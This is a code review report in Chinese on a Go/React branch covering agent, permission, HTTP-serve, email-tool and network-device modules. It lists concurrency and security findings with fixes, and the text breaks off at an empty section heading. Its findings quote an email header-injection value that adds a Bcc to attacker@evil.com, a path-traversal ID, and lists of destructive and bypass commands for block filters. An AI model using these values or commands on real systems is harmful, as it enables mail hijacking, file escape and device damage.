# 代码审查报告 — feat/mindmap-read-loop（2026-09-06/07 无人值守审查）

## 审查方法与范围决策

- 审查基线：`main` 分支；对象为当前分支 `feat/mindmap-read-loop` 相对 main 的全部改动 + 工作区未提交改动 + 未跟踪文件。
- 规模事实：相对 main 共 246 个提交、1096 个文件、+289,270/-32,954 行——**无法在时限内逐行全覆盖**。
- **决策（无人值守，自行裁定）**：按风险驱动分层：
  1. **第一优先**：工作区未提交改动（235 文件，+9,515/-1,606 行）与 25 个未跟踪新文件——最新、未经评审，问题最可能未被发现。
  2. **第二优先**：已提交改动中的高风险模块——并发/竞态（agent、scheduler、netdev 编排）、安全（trustdomain、mobilebridge、plugin 传输、permission）、跨平台构建一致性。
  3. **第三优先**：文档/CI/配置快速过目。
- 审查过程中每完成一个模块即追加保存本报告，任何时刻中断均有已保存进度。

## 总览

- 状态：**已完成**（2026-09-07 05:00 收尾；两个审查窗口并行推进，双窗口关键结论已互相交叉验证）
- 覆盖：工作区未提交改动 235 文件（+9,515/-1,606）与约 30 个未跟踪新文件 = **两轮独立审查**（第一窗口逐模块 + 第二窗口 4 个分诊代理 + 第二窗口亲自复核全部 P1 与 TOP P2）；已提交部分按风险分层抽审（agent/event、netdev 执行链、trustdomain nettrans 握手抽样）；机械校验：`go vet`/`go build` 全仓 + 根模块与 desktop 模块完整测试套件实跑。
- 问题统计（去重后）

| 严重程度 | 数量 | 说明 |
| --- | --- | --- |
| P0 阻断 | 0 | 未发现数据丢失级/安全直通级缺陷 |
| P1 严重 | 5 | AGENT-1、TOOL-1、TOOL-2、FE-1（+NETDEV-3 同域）、VET-1 |
| P2 一般 | 22 | PERM-1/2、SERVE-1、TOOL-3~6、FE-3/4、NETDEV-1/2/3、NETDEV-9~13、CORE-1~5 |
| P3 建议 | 约 35 | 各模块 P3 条目（NETDEV-14/17 为与 NETDEV-1/2 的同根备注，不计入重复） |

- 全部发现（含证据与修法）见下方「发现明细」；优先级整合见「汇总修复任务清单」；最终结论见文末「最终总结」。

---

## 发现明细

### 模块一：internal/agent + internal/event（未提交改动）

**已审文件**：`internal/agent/agent.go`、`compact.go`、`dream.go`、`interceptors.go`、`save.go`、`internal/event/itemadapter.go`；新增测试 `dream_test.go`、`loop_e2e_test.go`、`repeat_guard_test.go`、`event_test.go`；暂存删除 `crashrecovery.go`、`max_mode.go`、`parallel_tasks.go`、`event/snapshot.go`（已 grep 确认无残留引用，删除干净）。

**改动质量总评**：本批改动方向正确——补了 `repeatSuccessCounts` 的并发锁（配合并行 writer batch）、修复截断 turn 下孤儿 tool result（assistant 消息先于 skip results 持久化，符合 OpenAI/Anthropic API 契约）、`ItemAdapter` 补 Emit/Reset 串行化、HMAC key 从时间戳种子改为 crypto/rand（修掉可猜测密钥的真实安全隐患）、`stream` 补 nil ToolCall 防护。新增测试针对性好。以下为发现的问题。

---

#### AGENT-1 【P1 严重】compact/SummarizeFrom/SummarizeUpTo：快照→Replace 丢更新竞态，并发追加的消息被永久丢弃

- **位置**：`internal/agent/compact.go:218-342`（compact）、`compact.go:361-384`（SummarizeFrom）、`compact.go:391-418`（SummarizeUpTo）、`internal/agent/prune.go:77,122`（同一模式）。
- **问题描述**：本批改动把 `a.session.Messages` 直读改为 `a.session.Snapshot()`（加了锁的拷贝），修复了撕裂读；但整个流程仍是「读快照 → 计算 compacted → `a.session.Replace(compacted)` 整体换日志」的读-改-写。`Session.Replace` 是无条件整体覆盖（session.go:36-41），快照之后 run loop 追加的任何消息（用户消息、assistant 消息、tool result）都会被 Replace 静默丢弃，且持久化到 JSONL。
- **成因分析**：代码注释自证并发是真实场景——compact.go:220「/compact (CompactNow) runs detached from the run loop」，SummarizeFrom 注释「rewind/serve/remotehost callers invoke this outside the run loop, concurrent with turn appends」。作者只修了撕裂读，没修丢更新。调用链 `Controller.Compact`（control/controller.go:1882-1886）→ `CompactNow` 无任何「run 在途则拒绝/排队」的守卫。
- **建议修法**（二选一，推荐 A）：
  - A. Replace 改为基于 rewriteVersion 的 CAS：快照时记 `v0 := s.RewriteVersion()`，替换前检查版本未变且消息数未增长，否则重试或放弃本次 compact：
    ```go
    // Session 增加条件替换
    func (s *Session) ReplaceIfUnchanged(msgs []provider.Message, seenLen int) bool {
        s.mu.Lock()
        defer s.mu.Unlock()
        if len(s.Messages) != seenLen {
            return false // run loop 追加过，放弃本次重写，避免丢消息
        }
        s.Messages = msgs
        s.rewriteVersion++
        return true
    }
    ```
    compact 末尾失败时返回可重试错误（`ErrCompactContended`），调用方提示用户重试。
  - B. 在 Controller 层加互斥：run 在途时 `/compact` 返回「会话运行中，稍后再试」，从入口杜绝并发（改动小，但 serve/remotehost 调用方都要覆盖）。

---

#### AGENT-2 【P3 建议】save.go import 块格式破坏（gofmt 不通过）

- **位置**：`internal/agent/save.go:18-20`。
- **问题描述**：新增的 `"crypto/rand"`、`"encoding/hex"` 两条 import 被追加成 `"encoding/hex")`——右括号挤在行尾，且与前面的组之间空行分组混乱。语法合法、`hex` 确有使用（save.go:521），但 `gofmt`/`goimports` 会重排，若 CI 有 fmt 检查会挂。
- **建议修法**：
  ```go
  import (
      "crypto/hmac"
      "crypto/rand"
      "crypto/sha256"
      "encoding/hex"
      "encoding/json"
      ...
  )
  ```

---

### 模块二：internal/permission（bash 只读密封）— 第二审查窗口 00:05 审

本批改动为安全加固：封堵 `find -fprint*`/`-fls`、`env <cmd>` 元执行器、`hostname <name>` 改名、`date -s`、`less -o`、`git tag <args>`、`git reflog delete/expire` 等只读旁路。方向正确、`env` 解析器对组合 flag 的处理偏保守（安全方向）。遗留口子：

**PERM-1 【P2】`git reflog drop` 未被封堵（git ≥ 2.43 新子命令）**
- 位置：`internal/permission/bash_readonly.go:156-159`
- 问题：对 `git reflog` 只拒绝 `delete`/`expire`。git 2.43 新增 `git reflog drop <ref>`（销毁 reflog 条目），会按只读放行。
- 证据：`return hasAnyArg(args, "delete", "expire")`，`drop` 不在列表；配套测试无此用例。
- 建议修法：`return hasAnyArg(args, "delete", "expire", "drop")`，补测试 `{"git reflog drop HEAD", false}`。

**PERM-2 【P2】`--output` 写文件旁路只覆盖 diff/show/log，未覆盖同族命令**
- 位置：`internal/permission/bash_readonly.go:150-151`
- 问题：`git whatchanged --output=X`（whatchanged 即 log 家族，继承 `--output`）与 `git reflog show --output=X` 会写文件但被分类为只读。
- 证据：`case "diff", "show", "log":` 不含 `whatchanged`；`reflog` 分支只查 delete/expire 不查 `--output`。
- 建议修法：`whatchanged` 加入该 case；reflog 分支追加 `--output` 检查。

**PERM-3 【P3】`hostname` 一刀切拒绝全部参数，误伤只读查询**
- 位置：`internal/permission/bash_readonly.go:133-135`
- 问题：`return len(args) > 0` 连 `-f`/`-i`/`-d`（FQDN/IP/域名只读查询）也拒绝。方向安全但高频误报。
- 建议修法：仅拒绝非 flag 操作数与 `-F`/`--file`。

**PERM-4 【P3】挂起型"只读"命令会挂住工具直到超时**
- 位置：`internal/permission/bash_readonly.go:11,19`
- 问题：`tail -f`、无 `-b` 的 `top`/`htop`（交互全屏模式）被归为只读，无人值守管道里会挂住。
- 建议修法：`tail` 拒绝 `-f`/`-F`；`top`/`htop` 要求 `-b` 才放行。

另记（非缺陷）：`git tag -l <pattern>` 被一刀切拒绝（测试 `{"git tag -l", false}` 表明是有意保守），可接受。

---

### 模块三：internal/serve（HTTP 服务加固）— 第二审查窗口 00:00 审

本批为实质性安全加固，方向全部正确：新增 `hostGuard`（防 DNS rebinding）、`bodyLimit`（32MiB 请求体上限，防未认证大包打内存）、`ReadHeaderTimeout`/`IdleTimeout`（防 slowloris）、`/resume` 路径收拢（修任意文件读原语，`filepath.Rel` 越界判断写得对）。遗留问题：

**SERVE-1 【P2】`--addr :8787`（空主机 = 通配绑定）会静默完全禁用 hostGuard**
- 位置：`internal/serve/serve.go`（`setBindHost` + `hostGuard`）
- 问题：`setBindHost(":8787")` 经 `net.SplitHostPort` 得 host=""，`bindHost` 为空，而 `hostGuard`/`hostAllowed` 对空 bindHost 的语义是"测试直用，全放行"。用户把 CLI `--addr` 改成 `:8787`（常见 Go 惯用法，绑定全部网卡）后，本批加固的 rebinding 防护全部失效，且无任何告警。
- 证据：唯一生产调用点 `internal/cli/cli.go:357`，flag 默认 `127.0.0.1:8787`（默认安全，但可被覆盖）。
- 建议修法：`setBindHost` 里把空 host 归一化为 `"*"`（或 `"0.0.0.0"`），走通配分支的私网 IP 过滤；同时在通配绑定时打一条 WARN 日志。

**SERVE-2 【P3】import 顺序破坏（gofmt 不通过）**
- 位置：`internal/serve/serve.go` 顶部，`"net"` 插在 `"context"` 之前。
- 建议修法：`gofmt -w`。

**SERVE-3 【P3】/resume 路径收拢不解析符号链接**
- 位置：`internal/serve/serve.go`（resume 的 containment 段）
- 问题：`filepath.Abs` + `filepath.Rel` 不解析 symlink；会话目录内若出现指向外部的符号链接仍可越界。前提是本地文件系统已被写入，风险低。
- 建议修法：对 `abs` 与 `absDir` 先 `filepath.EvalSymlinks` 再比较。

---

### 模块四：internal/mobilebridge（审计修复批）— 第二审查窗口 00:55 审

本批是一轮安全审计的修复落地，逐项核实均属实且修法正确：`handleOffer` 双解锁 panic（真 bug）、`stampSeq` 补盖 `tab`（修多 tab 事件串号 + resync 游标错位）、`set_plan` 从恒真占位符改为真实解析 `on`（修手机端关不掉计划模式）、readonly/high_risk 拒绝回帧 `onError`（C 端零感知问题）、删除单边不兼容的"简化 rekey"改为阈值 fail-close（正确取舍，2^32 帧不可达）、`wss://` 不再被静默降级为 `ws://`、`route print` 加 CREATE_NO_WINDOW（修 GUI 闪 CMD 窗）、`QuestionAnswer` 结构化（修 C 端嵌套数组 unmarshal 失败）、`SubmitCmd.Attachments` 落地、`file_*` 纳入 high-risk 门控（收紧）。配套 e2e/单测已更新。

**MB-1 【P3】command_router 各 case 的 `json.Unmarshal(plaintext, &c)` 忽略错误（存量模式）**
- 位置：`internal/mobilebridge/command_router.go`（CmdAnswer/CmdSetPlan/CmdSetModel 等 case）
- 问题：payload 畸形时零值照常派发（如 `Answer(tab, "", nil)`），错误对 C 端表现为业务失败而非协议错误，排障困难。存量写法，本批未引入。
- 建议修法：统一 `if err := json.Unmarshal(...); err != nil { return err }`。

---

### 模块【netdev 执行链与接收器】（第一审查窗口 00:15 审，未提交改动 53 文件 +1577/-197）

**已审文件**：`cutover.go`、`proposal.go`、`proposal_steps.go`、`tools.go`、`traprecv.go`、`syslogrecv.go`、`notify.go`、`discovered.go`、`assess.go`、`baseline.go`、`cve.go`、`finding.go`、`layerdiscover.go`、`triage.go`、`driver/hosts.go`、`transport/knownhosts.go`、`selfexport.go`、`selfimport.go`、`srvconf.go`、`handoff.go`、`journal.go`。

**改动质量总评**：多轮真实事故驱动的加固——`AppliedCmds` 前缀回滚（步中失败也能回滚已落盘命令）、cert 备份 JSON 编码修复 legacy `\x00` 二义性（曾恢复出空证书/损坏密钥）、`newProposalID` 跨重启重播种（修同日重启 ID 碰撞覆盖）、`discoveredFile` 路径穿越防护、审计命令 `Redact`（修拒绝命令原文带凭证落审计文件）、全面换 `fileutil.AtomicWriteFile`、`recoverStaleExecuting` 崩恢复、弱口令复核不可达不再误 resolve。`m.Exec` 纵深防御（换行/控制符 → shell 元字符 → 只读分类 → 输出脱敏）扎实，预检 probe 注入面被入口守卫兜住。

---

#### NETDEV-1 【P2 一般】watching 提案自动关闭只依赖进程内 goroutine，重启后永久卡在 watching

- 位置：`internal/netdev/proposal.go:796-804`（auto-close goroutine）、`proposal.go:121`（WatchUntil 字段）。
- 问题：执行成功后 `p.Status = ProposalWatching`，靠 `go func(){ time.Sleep(until); ... }()` 30 分钟后置 closed。全仓库 `WatchUntil` 只有字段声明和这一处赋值，**没有任何地方检查它是否过期**（`checkWatchingProposals` 只做劣化检测，`CloseProposalWatch` 只处理人工关闭）。应用在观察期内重启 → goroutine 丢失 → 提案永远停在 watching：删除被拒（proposal.go:603 的 switch 不含 watching）、健康基线对比每轮轮询持续空转。
- 成因：自动关闭是「内存定时器」语义而非「数据截止时间」语义；作者给 `recoverStaleExecuting` 做了基于 mtime 的惰性恢复，却没给 watching 过期做惰性扫描。
- 修法：在 `ListProposals`（已有惰性恢复挂点）或 `checkWatchingProposals` 补过期扫描：
  ```go
  if p.Status == ProposalWatching && p.WatchUntil != nil && time.Now().After(*p.WatchUntil) {
      // 复用 auto-close 的置 closed 逻辑（锁内重读 + StateEventSnap + saveProposalLocked）
  }
  ```

#### NETDEV-2 【P2 一般】NotifyPushTextWithAttachments：配置 SMTP 时直接 return，bot/webhook 通道推送整体丢失

- 位置：`internal/netdev/notify.go:247-254`。
- 问题：`if o.smc != nil { go smtpSendTextWithAttachments(...); return }` —— 对照 `NotifyPushText`（:258-282）是 SMTP + bot + webhook **全通道扇出**，新函数在有 SMTP 时独占返回。同时配置 SMTP 和 bot/webhook 的用户，日报/告警只在邮箱收到，IM/群里静默丢失——通知类 bug 最难被注意到。
- 修法：SMTP 分支不再 return，附件对不支持通道降级为路径清单后继续走 `NotifyPushText`：
  ```go
  if o.smc != nil {
      go smtpSendTextWithAttachments(o.smc, title, text, attachments)
      if len(attachments) > 0 {
          text += "\n附件（本通道不支持附件，路径如下）：\n" + strings.Join(attachments, "\n")
      }
  }
  NotifyPushText(kind, title, text)
  ```
- 附注（P3，同函数）：`Subject: %s` 未过滤 CR/LF（可注入邮件头）；附件读失败静默 continue；base64 未按 76 字符折行，严格 SMTP 服务器可能拒收超长行。

#### NETDEV-3 【P2 一般】割接预检同步跑在 Wails 绑定里最长阻塞 3 分钟；共享超时让大舰队后半段全部误报红灯

- 位置：`internal/netdev/cutover.go:286-295`（CutoverStart 内同步调 runCutoverPrecheck）、`cutover.go:351`（3 分钟共享 ctx）；调用方 `desktop/netdev_app.go:2654`（前端直连绑定）。
- 问题：预检对每台设备串行跑完整 battery + 基线比对 + probe，全在 CutoverStart 调用栈——设备多/链路慢时前端点「开始割接」卡数十秒到 3 分钟无反馈。且 3 分钟 ctx **全舰队共享**：前面设备耗尽预算后，后续 `m.Exec` 全部直接超时 → item 全 Pass:false → 整场预检红灯。假红灯的代价是变更窗口延误（需人工 override 且留审计）。
- 修法：预检异步化（先落 `precheck-running` 立即返回，前端轮询 PrecheckReport）；或至少每设备独立超时（逐台 WithTimeout 发牌），item 区分「超时」与「失败」。
- 附注（P3）：`StateEventSnap(StateEventCutoverStart, ...)` 在预检之前发出——预检红灯也留"启动"事件，语义应为"尝试启动"；`devices` 是 map，预检 item 顺序每次刷新都变。

#### NETDEV-4 【P3 建议】trap community 校验取舍：未配置设备/未知源完全放行，可伪造 Finding 噪声

- 位置：`internal/netdev/traprecv.go:113-119`。
- 问题：设备配置了 community 则强校验（修复，好）。但未配置或源 IP 未知时接受任意 trap——LAN 内攻击者可伪造源 IP 冒充设备发 link-down trap，`trapEscalate` 每 10 分钟立案一条 Finding，持续伪造即持续告警噪声。另外 `env != ""` 但 secret 取回失败时返回 `("public", true)`：真设备的真 community 反而被当 mismatch 丢弃（可用性回退）。
- 修法：未配置 community 的 trap 仍进环缓冲但不立案（或标记 unverified）；secret 取回失败记日志并放行而非强校验 "public"。SNMPv2c 源 IP 可伪造属协议固有限制，存档即可。

#### NETDEV-5 【P3 建议】弱口令复核：部分 transport 失败仍自动 resolve

- 位置：`internal/netdev/assess.go:130-134`。
- 问题：本轮修复只覆盖「全部 attempt 都 transport 失败」。混合场景（3 候选中 2 个超时、1 个干净拒绝）仍走到 `resolveWeakCredFinding`——有候选实际没被复核，"复核通过"半真。
- 修法：`transportFails > 0` 时 Detail 注明"N 个候选因网络原因未复核"并跳过自动 resolve。

#### NETDEV-6 【P3 建议】`nvidia-smi -l`（循环监控模式）进只读白名单，会占住设备会话直到超时

- 位置：`internal/netdev/driver/hosts.go:72-74`。
- 问题：`-l` 前缀放行后 `nvidia-smi -l 1`（每秒刷屏死循环）被分类 Read 执行——`Session.Run`（session.go:186 起）按 prompt 锚点判完成，循环命令永远等不到 prompt，干等 `defaultCommandTimeout`，期间该设备诊断会话被互斥锁占住，后续命令全部排队。
- 修法：白名单去掉 `"nvidia-smi -l"`（保留 `-q`/`--query`/`--format` 单发形态）。

#### NETDEV-7 【P3 建议】triage GPU 温度检测只看第一行数据，多 GPU 主机后面的卡过热漏检

- 位置：`internal/netdev/triage.go:206-219`。
- 问题：CSV 循环命中第一行有效数据就 `break`——8 卡智算主机只有 GPU 0 被检查。同函数 XID 检测全行扫描，风格不一致，这个 break 更像笔误。另外 XID 的 `regexp.MustCompile` 在行循环内每行重新编译。
- 修法：去掉 break；`MustCompile` 提为包级 `var xidRe = ...`。

#### NETDEV-8 【P3 建议】recoverStaleExecuting 跨进程误标窗口；rm 引用防御纵深

- 位置：`internal/netdev/proposal.go:251-287`、`proposal_steps.go:198-208`。
- 问题：(a) `proposalInflight` 是进程内守卫——两实例共享数据目录时，A 实例执行中的提案会被 B 实例惰性扫描误标 partial（单实例部署无害）。(b) `sshRemoveFile` 用 `"rm -f '"+remotePath+"'"` 包裹——路径含单引号破坏引用（输入来自人审过的提案，风险低；建议 `'` → `'\''` 转义）。

---

**netdev 正面确认清单**（二轮复查可跳过）：`m.Exec` 五层守卫（tools.go:250-339）；`encodeCertBackup/decodeCertBackup` legacy 双格式兼容（空 cert/双 absent 边界推演正确）；`newProposalID` 磁盘重播种在锁内；`discoveredFile` 拒绝 `..` 与路径分隔符；`EnsureSyslogReceiver` capture-and-clear 修复连接竞态；`Syslog/TrapEventsSince` 空 device 合并全部环（修复静默空结果）；`SaveFinding` 通知移到落盘成功后；`assess.dialAuth` Close 泄漏修复。

---

---

### 模块五：internal/tool/builtin（分诊代理 + 第二窗口抽样复核）— 第二审查窗口 23:57 审

两条 P1 均由第二窗口亲自读码验证属实；其余为分诊代理报告并附行号证据（关键项已抽样核对）。

**TOOL-1 【P1】邮件头注入防护可被 display-name 绕过（已亲自验证）**
- 位置：`internal/tool/builtin/email.go:285-304`（checkAddrInjection）+ `:329-343`（buildMessage）
- 问题：`checkAddrInjection` 只校验 `<...>` 内的 addr-spec；display name 里的 CRLF 不检查，而 buildMessage 把整个地址串 `strings.Join(to, ", ")` 原样 `Fprintf("To: %s\r\n")` 写头。构造 `To: "Foo\r\nBcc: attacker@evil.com" <a@x.com>`：spec=a@x.com 校验通过，display name 的 CRLF 注入成功。威胁模型注释自述 to/cc/bcc 是 model-controlled，故这是新防护的真实缺口。
- 建议修法：先对整个 addr 串拒绝 CR/LF/0x00-0x1F/0x7F，再做现有 spec 细粒度检查；补 display-name 形式的测试。

**TOOL-2 【P1】browserflow 步骤重试对所有错误类别盲目重发，可双击/重复提交（已亲自验证）**
- 位置：`internal/tool/builtin/browserflow.go:1022-1040`（runFlowStepHarness）
- 问题：重试循环对 `flowExecStep` 的任何错误都 `continue` 重发。本包自己的契约（`isLocateMiss` 注释）明文："动作已发出后的错误绝不能重试——重跑可能双击"。缓解措施 `recheck-before-refire` 仅在配置了 `校验=` 时生效，无校验列的步骤（默认）是无条件重发；而 `重试=` 恰恰最常写在 click/导出等非幂等步骤上。
- 建议修法：重试前用 `isLocateMiss(lastErr)` 分流——只有锚点未命中（动作未发出）才重发；post-dispatch 错误直接失败留证。

**TOOL-3 【P2】dock 邮件列表改为整函正文抓取，单封无大小上限**
- 位置：`internal/tool/builtin/email_imap.go:139`（withBody=true）、`:447-456`（ReadAll 无上限）、`:763`（附件 Size 重复 ReadAll）
- 问题：开一次 dock 页签 = 对最多 30 封 `FETCH BODY[]` 全量入内存；大邮箱或恶意 IMAP 服务器可造成数百 MB 内存峰值。
- 建议修法：`io.LimitReader` 封顶单封（2-5MB）；附件 Size 改读头部信息。

**TOOL-4 【P2】apply_patch 回滚 "add" 一律 os.Remove——Add 覆盖已存在文件后中途失败会删掉用户原文件（第二窗口已核对回滚 switch：move/update 均有恢复逻辑，唯 add 不对称）**
- 位置：`internal/tool/builtin/apply_patch.go:351-357`（add 不捕获旧内容）+ 回滚 `case "add": os.Remove`
- 建议修法：Phase 1 对 add 目标 Stat，存在则读入 oldContent，回滚恢复；不存在才 Remove。

**TOOL-5 【P2】blank-tab 清扫会关掉并发 agent 会话刚建的 about:blank 页**
- 位置：`internal/tool/builtin/browser.go:1989-2000`（经 browserconsole.go:141/197 触发；agent 会话与 console 共用持久浏览器，takeover 测试证实）
- 问题：并发 run 新建页签在首次 navigate 前就是 about:blank，清扫（open/resume 后 2s/6s）会把它从脚下拆掉；此前 switchSessionTab 只关"本会话刚放弃的" blank（oldURL 判定），新清扫扩大到全局。
- 建议修法：只清创建超阈值（>30s）或带本会话来源标记的 blank。

**TOOL-6 【P2】日历搜索截断展示 12 字符 ID，update/delete 却要完整 ID——模型拿不到可用 ID**
- 位置：`internal/tool/builtin/calendar.go:353-359`（`store.Get` SQL 精确匹配，`evt_<UnixNano>` 恒 >12 字符）
- 建议修法：展示完整 ID，或 store.Get 支持 `evt_` 前缀匹配（加长度校验）。

**TOOL-7 【P3】sweep goroutine 无锁读 `s.ctx`，与 switchSessionTab 的写构成数据竞争**（browser.go:2024-2035；-race 可复现）
**TOOL-8 【P3】buildPlainTextMessage 无 CR/LF 防护**（email.go:76-80，与 TOOL-1 同类，建议复用 checkAddrInjection）

分诊代理同时核实无问题的改动（第二窗口抽样同意）：webfetch 空 IP 修复与逐跳 SSRF 校验、edit_fuzzy 行锚定消除误删 + blank 中段上限、untrusted 正则重写、screen_windows x64 布局推导、notebookedit/rag confine 越权修复（boot.go:775 已传 writeRoots）、browsersnapshot 本地计数器、apply_patch move 回滚修复本身。

---

### 模块六：前端（desktop/frontend/src，分诊代理 + 交叉核实）— 第二审查窗口 00:00 审

**FE-1 【P1】割接预检红绿灯 + 人工放行按钮是死代码（Go↔TS 契约断链；与 NETDEV-3 同域互补——那边是后端同步阻塞与超时误报，这里是前端拿不到数据）**
- 位置：`desktop/frontend/src/components/netdev/CutoverBoardView.tsx:59,74-77`
- 问题：前端渲染 `b.precheck_report`（含 `precheck-failed` 时的 `NetDevCutoverPrecheckOverride` 放行按钮），但 Go 侧 `netdev.CutoverBoard`（internal/netdev/dashboards.go:558-574）没有该字段，`BuildCutoverBoard` 也不从 `CutoverRun.PrecheckReport`（cutover.go:121）拷贝 → TS 侧 `precheck_report?` 恒 undefined → 预检 UI 永不渲染；预检失败后端停在 `precheck-failed`（cutover.go:288-295），UI 没有任何放行入口。
- 建议修法：给 `CutoverBoard` 加 `PrecheckReport *PrecheckReport`（json:"precheck_report,omitempty"）并在 BuildCutoverBoard 拷入。

**FE-2 【P1】BrowserSkillEditor 用 setState updater 当同步读取器，"失败步号"随 React 调度时有时无**
- 位置：`desktop/frontend/src/components/netdev/BrowserSkillEditor.tsx:277-289`
- 问题：`setTrialStates(updater)` 内给局部变量 `failedIdx` 赋值后立刻 `setDiagnosis({step: failedIdx, ...})`——React updater 在下次渲染才执行，`failedIdx` 大概率仍为 -1 → 诊断恒显示"第 0 步"、"去重录"按钮永不出现；StrictMode 下 updater 双调。
- 建议修法：用 ref 跟踪最近失败步号（单步事件处写入），最终失败事件直接读 ref。

**FE-3 【P2】MailView 阅读面板无乱序保护，快速连点两封信显示错误的信**（CoworkDock.tsx:704-720；慢响应迟到覆盖新信；附带 2500ms setInserted 定时器无清理；建议 seqRef 序号比对）
**FE-4 【P2】"测试连接"保存路径不更新 `editingDeviceOrig`，改名后同会话再保存产生重复设备**（NetDevSection.tsx:897-921；本批要修的"改名变新增"在该路径重新引入）
**FE-5 【P3】`f.fix.link`（源自用户导入的 CVE feed）未做 scheme 白名单直接进 `<a href>`**（NetDevLayout.tsx:3243、VulnScanPanel.tsx:102；`javascript:` URI 可成可点锚点；建议 https? 校验后再渲染）
**FE-6 【P3】审计项目删除无确认**（AuditProjectPanel.tsx:118-125；同仓破坏性操作均走 useConfirm danger）
**FE-7 【P3】审计运行是同步长阻塞绑定**（AuditProjectPanel.tsx:80-92 + netdev_app.go:2581-2595；多设备分钟级阻塞，切走即丢状态；建议仿巡检 kick+状态流）
**FE-8 【P3】多处静默吞错**（NetDevLayout.tsx:2699 `.catch(()=>{})` 零反馈；OverviewPanel 简报按钮失败与未点击不可区分）

分诊代理同时交叉核实无问题（第二窗口抽样同意）：AgentDashboard hooks 顺序修复、TerminalPanel `shell-` 前缀过滤与后端一致、本轮新增契约绑定与 TS 对齐（NetDevInspectionState/AuditProjectStatusView/ReadMailFull/TrustDomain*/watch round 字段）、usePanelData 序号防乱序接入正确、waitForTabReady 改抛错的调用方均在 try/catch 内、SettingsPanel StrictMode 重构语义不变、i18n 抽查 25 key 齐全。

---

### 模块七：internal/netdev 二轮分诊（与 NETDEV-1..8 去重）— 第二审查窗口 00:01 审

只列第一窗口未覆盖的增量。TOP3 均由第二窗口亲自读码验证。

**NETDEV-9 【P2】CutoverPrecheckOverride 锁外保存+启动，过期整对象回写可回卷运行中的割接（已亲自验证）**
- 位置：`internal/netdev/cutover.go:444-462`
- 问题：状态改 `CutoverRunning` 在锁内，但 `saveCutover(c)` 在解锁后写的是**旧快照**（含 Cursor 与全部 step 状态）。双击"放行"时两个 override 都能通过文件里的 `precheck-failed` 检查；第二次 `cutoverLaunch` 起新 runner 后，第一个 override 的迟到保存把 Cursor 回卷为 0 → runner 重读文件后对已执行的 direct-command step **再次执行**（proposal step 因 watching 会被拒，direct command 会真打两遍设备）。同文件 `CutoverContinue`/`CutoverAbort` 都是锁内 `saveCutoverLocked` 的正确范式。
- 建议修法：仿 CutoverContinue——锁内 `saveCutoverLocked`，解锁后再 audit + launch；或加 per-id 过渡标记防重入。

**NETDEV-10 【P2】部分失败 step 的回滚跑全量 rollback 清单，未按 AppliedCmds 截断**
- 位置：`internal/netdev/proposal.go:876,906-916`
- 问题：mid-step 失败的 step（Applied=false, AppliedCmds>0）参与回滚，但 cli 分支 `for _, cmd := range s.Rollback` 跑整张表——第 k+1 条反演命令操作的配置不存在 → 设备报错 → 回滚提前终止、proposal 标 failed，**更早的未遍历 step 不再回滚**，现场与状态不一致。
- 建议修法：`roll = s.Rollback[:s.AppliedCmds]`，Note 说明按前缀回滚。

**NETDEV-11 【P2】危险动词表漏 `reload`/`format`/`poweroff` 等，破坏性命令可绕过强制 confirm2（已亲自验证正则）**
- 位置：`internal/netdev/proposal_steps.go:36`
- 问题：`dangerVerbRe` 只含 delete/drop/truncate/erase/undo/reset/shutdown/reboot/restart/scale-down/rm -rf——Cisco `reload`（整机重启）、`format flash:`、Linux `poweroff`/`halt`/`init 6`/`systemctl stop|disable|mask`/`mkfs`/`dd`、以及 `no vlan`/`no ip route` 等 `no …` 破坏形态全不命中 → 无 confirm2 分组策略时这类 step 一次批准即执行。
- 建议修法：补 `reload|format|poweroff|halt|mkfs|dd|systemctl (stop|disable|mask)`；对 cli step 的 `no <x>` 形态降级为需 confirm2（宁可误报）。

**NETDEV-12 【P2】auditproject 项目 ID 未做路径校验，桌面桥直接落盘 → 路径穿越读写（已亲自验证）**
- 位置：`internal/netdev/auditproject.go:69-75`（`filepath.Join(auditDir(), id+".json")`）；调用方 netdev_app.go:2563/2611/2619 均未校验；`auditReportPath(projectID, at)` 同源
- 问题：ID 形如 `..\..\evil` 逃出 audit-projects 目录。同一改动集 `GetProposal/GetTemplate/SrvConfText/GetBackupText` 都新加了 `validStoreID` 守卫（storeid.go），唯独新文件没套——像是写于加固之前。
- 建议修法：Save/Status/SetItemStatus/Delete 入口统一 `validStoreID`（报告 `at` 段同样）。

**NETDEV-13 【P2】SetAuditItemStatus 读-改-写不原子，丢更新/覆盖旧报告**
- 位置：`internal/netdev/auditproject.go:339-358`（锁内读 → 锁外改 → 只在写时加锁）
- 问题：并发两个 SetStatus 各持旧副本互相覆盖；期间 RunProjectAudit 落新报告时，本次写落在旧 `At` 文件上，放行判定静默丢失。
- 建议修法：整段（读最新→改→写）进 `auditProjMu` 临界区，写前重验 `rep.At` 仍是最新。

**NETDEV-14 【P3】watching 自动关闭只靠进程内 timer，重启后永久滞留且 Delete 被拒**（proposal.go:796-806；与 NETDEV-1 同根，修法建议：懒扫描按 WatchUntil 补关闭）
**NETDEV-15 【P3】trap community secret 解析失败时猜 "public" 强比对，丢该设备全部真实 trap**（traprecv.go:180-196；建议 `return "", false` 跳过比对）
**NETDEV-16 【P3】trap 回调闭包钉死启动时 cfg 快照，后加设备恒 "(unknown)"**（traprecv.go:74-76；syslog 侧已修同题，照搬 trapCfg 全局刷新）
**NETDEV-17 【P3】NotifyPushTextWithAttachments 配置 SMTP 后吞 bot/webhook 出口，且全仓无调用方（G3-2 预埋死代码）**（notify.go:244-254；=NETDEV-2）
**NETDEV-18 【P3】briefing 变更段 `sort.Slice(... return false)` 是带误导注释的空操作；状态词汇与 watching→closed 直通脱节**（briefing.go:105,125-126）
**NETDEV-19 【P3】新存储 0o755/0o644 偏离包内 0o700/0o600 惯例**（auditproject.go:81,94；审计报告含设备清单/联系人，POSIX 多用户主机信息暴露）
**NETDEV-20 【P3】GetCutover 漏加 validStoreID，与同批加固不一致**（cutover.go:175-185）
**NETDEV-21 【P3】ResetSharedRemoteNode 无同步重置 sync.Once，并发可拿 (nil,nil) 下游 panic**（remotetool.go:28-38；-race 必报）
**NETDEV-22 【P3】auditFindingInScope 只比对 f.Devices[0]，多设备发现漏采**（auditproject.go:363-373；建议 slices.Contains）
**NETDEV-23 【P3】BuildInvestigationChain 回退块缩进错乱（gofmt 级，功能不受影响）**（dashboards.go:248-258）

netdev 分诊代理同时核实：confirm2 三道闸（approve→execute→cutover）无被新代码绕过的路径；信封/scope 门控完好；cert 备份编解码修复经逐分支验算正确；syslog/trap 接收器无解析 panic 面。

---

### 模块八：agent 核心循环/调度/桌面绑定（分诊代理 + 交叉核实）— 第二审查窗口 00:05 审

